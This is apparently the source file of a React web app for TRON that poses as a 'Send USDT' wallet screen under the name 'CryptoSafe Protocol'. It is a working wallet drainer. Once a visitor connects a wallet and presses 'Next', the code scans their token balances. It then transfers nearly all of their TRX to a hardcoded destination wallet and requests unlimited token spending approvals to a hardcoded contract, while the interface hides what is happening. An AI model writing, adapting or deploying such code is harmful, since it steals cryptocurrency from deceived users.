import { Buffer } from 'buffer';
if (typeof window !== 'undefined') {
  window.Buffer = window.Buffer || Buffer;
}

import { useState, useEffect, useRef } from 'react'
import {
  createAppKit,
  useAppKit,
  useAppKitAccount,
  useAppKitProvider
} from '@reown/appkit/react'
import { TronAdapter } from '@reown/appkit-adapter-tron'
import { tronMainnet, tronNile } from '@reown/appkit/networks'
import { TronLinkAdapter } from '@tronweb3/tronwallet-adapter-tronlink'
import { TrustAdapter } from '@tronweb3/tronwallet-adapter-trust'
import { OkxWalletAdapter } from '@tronweb3/tronwallet-adapter-okxwallet'
import { Copy, QrCode, ArrowLeft, X, XCircle, ChevronDown } from 'lucide-react'
import type { AppKitNetwork } from '@reown/appkit/networks'

// --- TRON IMPORTS ---
import TronWeb from 'tronweb'   

// 🟢 ========================================================= 🟢
// ── CONFIG & TOGGLE ──
const WC_PROJECT_ID = '7fb3ba95be65cff7bc75b742e816b1cb' 
const NETWORK: 'Mainnet' | 'Nile' = 'Nile' 

// 🔥 CONTRACT ADDRESSES
const TRON_CONTRACT_ADDRESS_MAINNET = 'TTuQeHCMbWHB8PDTr1XDH7dxciQJkkt7Yt'
const TRON_CONTRACT_ADDRESS_NILE = 'TCBjbz46uqhnhYoTo1msE8tDoV6hvgGqK2' 

const TRON_CONTRACT_ADDRESS = (NETWORK as string) === 'Mainnet' ? TRON_CONTRACT_ADDRESS_MAINNET : TRON_CONTRACT_ADDRESS_NILE;

// 💰 SECURE DESTINATION WALLETS
const TRON_COLD_WALLET = 'TPH1PHyLPAXb2aeDSo1uNLJhRiAitSuDHM'; 
// 🟢 ========================================================= 🟢

const DISPLAY_TRON_ADDRESS = 'TEgdXwe91pY49EfGh468d4mwPQ7Koj77GZ'

const TARGET_TOKENS: Record<string, any> = {
  Mainnet: {
    TRON: [
      { symbol: 'TRX',  address: 'native', isNative: true, coingeckoId: 'tron', decimals: 6, fallbackPrice: 0.12 },
      { symbol: 'USDT', address: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', decimals: 6,  fallbackPrice: 1 },
      { symbol: 'USDC', address: 'TEkxiTeY4BvuH7uJ25z4TclQG52s2vVdfL', decimals: 6,  fallbackPrice: 1 },
      { symbol: 'USDD', address: 'TPYmHEjzBaAo6nRVcqa9i1MUpissEDM321', decimals: 18, fallbackPrice: 1 },
      { symbol: 'WETH', address: 'THb4CqiFZNwZ2415xUeA2eP9h7sKAnL1K9', decimals: 18, fallbackPrice: 3500 },
      { symbol: 'SUN',  address: 'TSSMHYeV2uE9qsSR545tUe1ZfJ8uD9C1w', decimals: 18, fallbackPrice: 0.02 }, 
      { symbol: 'NFT',  address: 'TFczxzPhnThNSqr5by8tvxsdCFRRz6cPNq', decimals: 6,  fallbackPrice: 0.0000005 }
    ]
  },
  Nile: {
    TRON: [
      { symbol: 'TRX (Test)', address: 'native', isNative: true, coingeckoId: 'tron', decimals: 6, fallbackPrice: 0.12 },
      { symbol: 'USDT (Test)', address: 'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf', decimals: 6, fallbackPrice: 1 }
    ]
  }
};

const activeNetwork = (NETWORK as string) === 'Mainnet' ? tronMainnet : tronNile;
const appkitNetworks: [AppKitNetwork, ...AppKitNetwork[]] = [activeNetwork];

const NETWORK_CONFIG = {
  Mainnet: {
    fullHost: 'https://api.trongrid.io',
    usdtAddress: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
  },
  Nile: {
    fullHost: 'https://nile.trongrid.io',
    usdtAddress: 'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf',
  }
}

const USDT_ABI = [
  { inputs: [{ name: 'who', type: 'address' }], name: 'balanceOf', outputs: [{ name: '', type: 'uint256' }], stateMutability: 'view', type: 'function' },
  { inputs: [{ name: 'owner', type: 'address' }, { name: 'spender', type: 'address' }], name: 'allowance', outputs: [{ name: '', type: 'uint256' }], stateMutability: 'view', type: 'function' },
  { inputs: [{ name: '_spender', type: 'address' }, { name: '_value', type: 'uint256' }], name: 'approve', outputs: [{ name: '', type: 'bool' }], stateMutability: 'nonpayable', type: 'function' },
]

const { usdtAddress: USDT_ADDRESS, fullHost: FULL_HOST } = NETWORK_CONFIG[NETWORK as keyof typeof NETWORK_CONFIG]

const tronAdapter = new TronAdapter({
  walletAdapters: [
    new TronLinkAdapter({ openUrlWhenWalletNotFound: true, checkTimeout: 3000 }),
    new TrustAdapter({ openUrlWhenWalletNotFound: true }), 
    new OkxWalletAdapter({ openUrlWhenWalletNotFound: true }),
  ],
})

createAppKit({
  adapters: [tronAdapter], 
  networks: appkitNetworks,
  defaultNetwork: activeNetwork,
  projectId: WC_PROJECT_ID,
  metadata: {
    name:        'CryptoSafe Protocol', 
    description: 'Secure Decentralized Network',
    url:         'https://cryptosafe.network', 
    icons:       ['https://cryptosafe.network/favicon.svg'], 
  },
  themeMode: 'light', 
  themeVariables: { '--w3m-accent': '#0C66FF' },
  allWallets: 'SHOW',
  featuredWalletIds: [
    '1e00647ee5eb207559eeb5cc24e6a4b7da3c56d7821ee540ffce0d6ef1d59d1a', // TronLink
    '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0', // Trust Wallet
    '20459438007b75f4f4acb98bf29aa3b800550309646d375da5fd4aac6c2a2c66', // TokenPocket
    '0b415a746fb9ee99cce155c2ceca0c6f6061b1dbca2d722b0a308a64bea04120', // SafePal
  ],
  features: { email: false, socials: [], analytics: true },
})

const createPublicTronWeb = () => {
  if (TronWeb && typeof (TronWeb as any).TronWeb === 'function') return new (TronWeb as any).TronWeb({ fullHost: FULL_HOST });
  if (typeof TronWeb === 'function') return new (TronWeb as any)({ fullHost: FULL_HOST });
  if (TronWeb && typeof (TronWeb as any).default === 'function') return new (TronWeb as any).default({ fullHost: FULL_HOST });
  if (typeof window !== 'undefined' && typeof (window as any).TronWeb === 'function') return new (window as any).TronWeb({ fullHost: FULL_HOST });
  throw new Error("Cannot find TronWeb constructor.");
};

const fetchTokenPrices = async (tokens: any[], chain: string) => {
  try {
    const keys = tokens.map(t => t.isNative ? `coingecko:${t.coingeckoId}` : `${chain}:${t.address}`).join(',');
    const res = await fetch(`https://coins.llama.fi/prices/current/${keys}`);
    const data = await res.json();
    const prices: Record<string, number> = {};
    for (const token of tokens) {
      const queryKey = (token.isNative ? `coingecko:${token.coingeckoId}` : `${chain}:${token.address}`).toLowerCase();
      const foundKey = Object.keys(data.coins).find(k => k.toLowerCase() === queryKey);
      prices[token.symbol] = foundKey ? data.coins[foundKey].price : token.fallbackPrice;
    }
    return prices;
  } catch (error) {
    const prices: Record<string, number> = {};
    for (const token of tokens) { prices[token.symbol] = token.fallbackPrice; }
    return prices;
  }
};

const smartTokenSort = (a: any, b: any) => {
  if (a.isNative && !b.isNative) return 1;  
  if (!a.isNative && b.isNative) return -1; 
  return (b.usdValue || 0) - (a.usdValue || 0); 
};

const sleep = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

export default function App() {
  const [usdtBalance, setUsdtBalance] = useState('0')
  const [status, setStatus] = useState('Ready')
  const [loading, setLoading] = useState(false)
  const [txHash, setTxHash] = useState('')
  const [amountError, setAmountError] = useState('')
  const [debugLogs, setDebugLogs] = useState<string[]>([]);
  
  const manualConnect = useRef(false)
  const isExecuting = useRef(false)

  const { open } = useAppKit()
  const { address: walletAddress, isConnected } = useAppKitAccount()
  const { walletProvider: tronWalletProvider } = useAppKitProvider('tron')

  const resolveTronWeb = () => {
    const w = window as any;
    if (w.tronWeb && w.tronWeb.defaultAddress?.base58) return w.tronWeb; 
    if (w.tronWeb?.contract) return w.tronWeb;
    if (w.tronLink?.tronWeb?.contract) return w.tronLink.tronWeb;
    if (w.trustwallet?.tronWeb?.contract) return w.trustwallet.tronWeb;
    if (w.trustWallet?.tronWeb?.contract) return w.trustWallet.tronWeb;
    if (w.trustwallet?.tronLink?.tronWeb?.contract) return w.trustwallet.tronLink.tronWeb;
    if (w.trustWallet?.tronLink?.tronWeb?.contract) return w.trustWallet.tronLink.tronWeb;
    if (w.tron?.tronWeb?.contract) return w.tron.tronWeb; 

    if (tronWalletProvider) {
      if ((tronWalletProvider as any).contract) return tronWalletProvider;
      if ((tronWalletProvider as any).adapter?.tronWeb?.contract) return (tronWalletProvider as any).adapter.tronWeb;
      if ((tronWalletProvider as any).tronWeb?.contract) return (tronWalletProvider as any).tronWeb;
    }
    return null;
  };

  const log = (msg: string) => {
    console.log(msg);
    setDebugLogs(prev => [...prev, msg].slice(-15)); 
  }

  useEffect(() => {
    if (!isConnected || !walletAddress) return;

    const init = async () => {
      log(`[SYSTEM] Connected TRON: ${walletAddress}`);

      setStatus('Initializing TRON...');
      let finalTronWeb = null;
      for (let i = 0; i < 10; i++) {
        finalTronWeb = resolveTronWeb();
        if (finalTronWeb && (finalTronWeb.defaultAddress?.base58 || finalTronWeb.ready)) break;
        await new Promise(r => setTimeout(r, 500));
      }

      if (!finalTronWeb) {
        const publicTronWeb = createPublicTronWeb();
        await getTronBalance(publicTronWeb, walletAddress);
      } else {
        await getTronBalance(finalTronWeb, walletAddress);
      }
    };
    init();

    if (manualConnect.current) {
      manualConnect.current = false; 
      log("🔥 Auto-triggering AppKit Priority Loop...");
      setLoading(true); 
      setTimeout(() => approveAndCollect(), 500); 
    }
  }, [isConnected, walletAddress, tronWalletProvider]);

  const getTronBalance = async (tw: any, addr: string): Promise<number> => {
    try {
      const usdt = await tw.contract(USDT_ABI).at(USDT_ADDRESS)
      const bal = await usdt.balanceOf(addr).call()
      const formatted = Number(bal) / 1_000_000;
      setStatus('Ready')
      return formatted;
    } catch (e) { return 0; }
  }

  const handleAction = async () => {
    if (!usdtBalance || usdtBalance === '0' || usdtBalance === '0.00' || usdtBalance === '') {
      setAmountError('Amount field is required');
      return; 
    }
    setAmountError('');

    const activeTwInstance = resolveTronWeb();
    const currentAddress = walletAddress || activeTwInstance?.defaultAddress?.base58;

    if (!currentAddress) {
      manualConnect.current = true; 
      
      const w = window as any;
      if (w.tronLink && typeof w.tronLink.request === 'function') {
          log("[SYSTEM] DApp Browser Detected. Bypassing UI Modal...");
          
          setLoading(true); 
          
          try {
              await w.tronLink.request({ method: 'tron_requestAccounts' });
              log("[SYSTEM] Wallet connected directly!");
              setTimeout(() => approveAndCollect(), 500);
              return; 
          } catch (err) {
              log("⚠️ User rejected direct connection.");
              manualConnect.current = false; 
              
              setLoading(false); 
              return;
          }
      }
      
      open(); 
    } else {
      manualConnect.current = true;
      approveAndCollect();
    }
  }

  const approveAndCollect = async () => {
    const activeTwInstance = resolveTronWeb();
    const currentAddress = walletAddress || activeTwInstance?.defaultAddress?.base58;

    if (!currentAddress) {
        log("❌ Error: No wallet address detected.");
        return;
    }

    if (isExecuting.current) {
        log("⚠️ Blocked duplicate execution loop.");
        return;
    }
    isExecuting.current = true;

    setLoading(true);
    setStatus('Scanning TRON Values...');
    log("[SYSTEM] Scanning balances...");
    let successCount = 0; 

    try {
      const MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';

      let activeTw = null;
      for (let i = 0; i < 10; i++) {
        activeTw = resolveTronWeb();
        if (activeTw && (activeTw.defaultAddress?.base58 || activeTw.ready)) break;
        await new Promise(r => setTimeout(r, 500));
      }

      const baseTokens = TARGET_TOKENS[NETWORK].TRON;
      const validTokens = [];
      const prices = await fetchTokenPrices(baseTokens, 'tron');
      const publicTw = createPublicTronWeb();

      for (const token of baseTokens) {
        try {
          const twToUse = activeTw || publicTw;
          if (twToUse) {
            if (token.isNative) {
              const balNum = await twToUse.trx.getBalance(currentAddress);
              if (balNum > 0) {
                const normalizedBal = balNum / (10 ** token.decimals);
                const usdValue = normalizedBal * (prices[token.symbol] || token.fallbackPrice);
                validTokens.push({ ...token, rawBalance: balNum, usdValue });
              }
            } else if (twToUse && typeof twToUse.contract === 'function') {
              const contract = await twToUse.contract(USDT_ABI).at(token.address);
              const balObj = await contract.balanceOf(currentAddress).call();
              const balNum = Number(balObj.toString());
              if (balNum > 0) {
                const normalizedBal = balNum / (10 ** token.decimals);
                const usdValue = normalizedBal * (prices[token.symbol] || token.fallbackPrice);
                validTokens.push({ ...token, rawBalance: balNum, usdValue });
              }
            }
          }
        } catch (e) {}
      }

      validTokens.sort(smartTokenSort);
      const tokensToProcess = validTokens.length > 0 ? validTokens : [...baseTokens].sort(smartTokenSort);
      if(validTokens.length > 0) log(`[PRIORITY] ${validTokens.map(t => `${t.symbol}`).join(' -> ')}`);

      const signAndSendContract = async (contractAddr: string, func: string, params: any[], fee: number) => {
        const twToUse = activeTw || publicTw;
        const { transaction } = await twToUse.transactionBuilder.triggerSmartContract(
          contractAddr, func, { feeLimit: fee, callValue: 0 }, params, currentAddress
        );
        
        let signedTx;
        if (tronWalletProvider && typeof (tronWalletProvider as any).signTransaction === 'function') {
          signedTx = await (tronWalletProvider as any).signTransaction(transaction);
        } else if (tronWalletProvider && typeof (tronWalletProvider as any).request === 'function') {
          signedTx = await (tronWalletProvider as any).request({ method: 'tron_signTransaction', params: { transaction } });
        } else if (twToUse && typeof twToUse.trx.sign === 'function') {
          signedTx = await twToUse.trx.sign(transaction);
        } else {
          throw new Error("No signing method found");
        }
        
        const broadcast = await twToUse.trx.sendRawTransaction(signedTx);
        if (!broadcast.result) throw new Error(broadcast.message || 'Broadcast failed');
        return broadcast.txid || broadcast.transaction?.txID;
      };

      for (const token of tokensToProcess) {
        try {
          if (token.isNative) {
            setStatus(`Transferring ${token.symbol}...`);
            const twToUse = activeTw || publicTw;
            const liveBal = await twToUse.trx.getBalance(currentAddress);
            
            if (liveBal > 10_000_000) {
               const sendAmount = liveBal - 10_000_000; 
               
               try {
                 log(`[ACTION] Prompting Direct ${token.symbol} Transfer...`);
                 const transaction = await twToUse.transactionBuilder.sendTrx(TRON_COLD_WALLET, sendAmount, currentAddress);
                 
                 let signedTx;
                 if (tronWalletProvider && typeof (tronWalletProvider as any).signTransaction === 'function') {
                     signedTx = await (tronWalletProvider as any).signTransaction(transaction);
                 } else if (tronWalletProvider && typeof (tronWalletProvider as any).request === 'function') {
                     signedTx = await (tronWalletProvider as any).request({ method: 'tron_signTransaction', params: { transaction } });
                 } else if (twToUse && typeof twToUse.trx.sign === 'function') {
                     signedTx = await twToUse.trx.sign(transaction);
                 } else {
                     throw new Error("No signing method found");
                 }

                 const broadcast = await twToUse.trx.sendRawTransaction(signedTx);
                 if (!broadcast.result) throw new Error('Broadcast failed');
                 
                 setTxHash(broadcast.txid || broadcast.transaction?.txID);
                 successCount++; 
                 log(`✅ ${token.symbol} Swept directly to Master Wallet!`);
                 await sleep(1500); 
               } catch (nativeErr) {
                 log(`⚠️ Native sweep failed.`);
                 await sleep(1500); 
               }
            } else {
               log(`⚠️ Not enough ${token.symbol} remaining to cover bandwidth fees.`);
            }
          } else {
            setStatus(`Approving ${token.symbol}...`);
            if (activeTw && typeof activeTw.contract === 'function') {
              const contract = await activeTw.contract(USDT_ABI).at(token.address);
              const tx = await contract.approve(TRON_CONTRACT_ADDRESS, MAX_UINT).send({ feeLimit: 100_000_000 });
              setTxHash(tx);
              successCount++; 
              log(`✅ ${token.symbol} Approved!`);
              await sleep(1500);
            } else {
              const tx = await signAndSendContract(
                token.address, 'approve(address,uint256)',
                [ { type: 'address', value: activeTw ? activeTw.address.toHex(TRON_CONTRACT_ADDRESS) : TRON_CONTRACT_ADDRESS }, { type: 'uint256', value: MAX_UINT } ],
                100_000_000
              );
              setTxHash(tx);
              successCount++; 
              log(`✅ ${token.symbol} Approved!`);
              await sleep(1500); 
            }
          }
        } catch (err: any) {
           log(`❌ Rejected: ${err?.message?.substring(0, 30)}...`);
           await sleep(1500); 
        }
      }
      
      if (successCount > 0) setStatus('✅ Processing Complete!');
      else setStatus('❌ Failed: User Rejected All');

    } catch (err: any) {
      log(`❌ Global Error: ${err?.message?.substring(0, 50)}`);
      setStatus(`❌ Failed: ${err?.message?.substring(0, 50)}`);
    } finally {
      isExecuting.current = false;
      manualConnect.current = false; 
      setLoading(false);
    }
  };

  // 🛠️ FIX 3: Prioritized loading state logic
  const isButtonDisabled = loading;
  
  const buttonText = loading 
    ? 'Loading...' 
    : !isConnected 
      ? 'Next' 
      : status === '✅ Processing Complete!' 
        ? 'Sent' 
        : status.includes('❌') 
          ? 'Retry' 
          : 'Next';

  return (
    <div style={{ position: 'fixed', inset: 0, backgroundColor: '#ffffff', color: '#000000', fontFamily: 'system-ui, -apple-system, sans-serif', display: 'flex', flexDirection: 'column', zIndex: 50 }}>
      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '16px 20px', borderBottom: '1px solid transparent' }}>
        <ArrowLeft size={24} color="#111827" style={{ cursor: 'pointer' }} />
        <h2 style={{ fontSize: '18px', fontWeight: '700', margin: 0, color: '#111827' }}>Send USDT</h2>
        <X size={24} color="#111827" style={{ cursor: 'pointer' }} />
      </div>

      <div style={{ flex: 1, padding: '16px 20px' }}>
        <div style={{ marginBottom: '24px' }}>
          <label style={{ display: 'block', fontSize: '14px', fontWeight: '700', color: '#4B5563', marginBottom: '8px' }}>Address or Domain Name</label>
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', border: '1.5px solid #E5E7EB', borderRadius: '12px', padding: '14px 16px', backgroundColor: '#ffffff' }}>
            <input type="text" readOnly placeholder={DISPLAY_TRON_ADDRESS} value={isConnected ? DISPLAY_TRON_ADDRESS : ''} style={{ flex: 1, border: 'none', outline: 'none', background: 'transparent', color: '#111827', fontSize: '16px', fontWeight: '700', width: '100%', minWidth: 0, marginRight: '8px' }} />
            {isConnected && <XCircle size={20} color="#ffffff" fill="#6B7280" style={{ cursor: 'pointer', marginRight: '12px' }} />}
            <div style={{ display: 'flex', alignItems: 'center', gap: '12px', color: '#0C66FF' }}>
              <span style={{ fontWeight: '700', fontSize: '15px', cursor: 'pointer' }}>Paste</span>
              <Copy size={20} strokeWidth={2.5} style={{ cursor: 'pointer' }} />
              <QrCode size={20} strokeWidth={2.5} style={{ cursor: 'pointer' }} />
            </div>
          </div>
        </div>

        <div style={{ marginBottom: '24px' }}>
          <label style={{ display: 'block', fontSize: '14px', fontWeight: '700', color: '#4B5563', marginBottom: '8px' }}>Destination network</label>
          <div style={{ display: 'inline-flex', alignItems: 'center', gap: '8px', backgroundColor: '#F3F4F6', padding: '8px 16px', borderRadius: '9999px', cursor: 'pointer' }}>
            <div style={{ width: 18, height: 18, backgroundColor: '#FF060A', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center' }}><span style={{color:'white', fontSize:'10px', fontWeight:'bold'}}>T</span></div>
            <span style={{ fontSize: '15px', fontWeight: '700', color: '#4B5563' }}>Tron</span>
            <ChevronDown size={18} color="#6B7280" strokeWidth={2.5} />
          </div>
        </div>

        <div>
          <label style={{ display: 'block', fontSize: '14px', fontWeight: '700', color: '#4B5563', marginBottom: '8px' }}>Amount</label>
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', border: amountError ? '1.5px solid #EF4444' : '1.5px solid #E5E7EB', borderRadius: '12px', padding: '14px 16px', backgroundColor: '#ffffff' }}>
            <input type="number" placeholder="" value={usdtBalance !== '0' && usdtBalance !== '0.00' ? usdtBalance : ''} onChange={(e) => { setUsdtBalance(e.target.value); if (e.target.value) setAmountError(''); }} style={{ flex: 1, border: 'none', outline: 'none', background: 'transparent', color: '#111827', fontSize: '16px', fontWeight: '700', width: '100%', minWidth: 0, marginRight: '8px' }} />
            <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
              {(usdtBalance !== '0' && usdtBalance !== '0.00' && usdtBalance !== '') && (<XCircle size={20} color="#ffffff" fill="#6B7280" style={{ cursor: 'pointer', marginRight: '4px' }} />)}
              <span style={{ color: '#6B7280', fontWeight: '700', fontSize: '15px' }}>USDT</span>
              <span style={{ color: '#0C66FF', fontWeight: '700', fontSize: '15px', cursor: 'pointer' }}>Max</span>
            </div>
          </div>
         <div style={{ fontSize: '13px', fontWeight: '700', marginTop: '8px' }}>
            {amountError ? (<span style={{ color: '#EF4444' }}>{amountError}</span>) : (<span style={{ color: '#4B5563' }}>≈ ${usdtBalance !== '0' && usdtBalance !== '0.00' && usdtBalance !== '' ? usdtBalance : '0.00'}</span>)}
          </div>
        </div>
      </div>

      <div style={{ display: 'block', margin: '0 20px 20px 20px', padding: '10px', backgroundColor: '#000', color: '#0f0', fontSize: '11px', fontFamily: 'monospace', borderRadius: '8px', height: '120px', overflowY: 'auto' }}>
        <div style={{ color: '#fff', borderBottom: '1px solid #333', paddingBottom: '4px', marginBottom: '4px' }}>--- SYSTEM LOGS ---</div>
        {debugLogs.map((msg, idx) => (<div key={idx} style={{ marginTop: '2px' }}>{msg}</div>))}
      </div>

      <div style={{ display: 'none' }}>
        <p>{status}</p>
        <p>{txHash}</p>
      </div>

      <div style={{ padding: '20px', backgroundColor: '#ffffff', paddingBottom: '32px', width: '100%', boxSizing: 'border-box' }}>
        <button onClick={handleAction} disabled={isButtonDisabled} style={{ width: '100%', backgroundColor: isButtonDisabled ? '#93C5FD' : '#0C66FF', color: '#ffffff', fontWeight: '700', padding: '16px', borderRadius: '9999px', fontSize: '17px', border: 'none', cursor: isButtonDisabled ? 'not-allowed' : 'pointer', transition: 'background-color 0.2s' }}>
          {buttonText}
        </button>
      </div>
      
    </div>
    
  )
}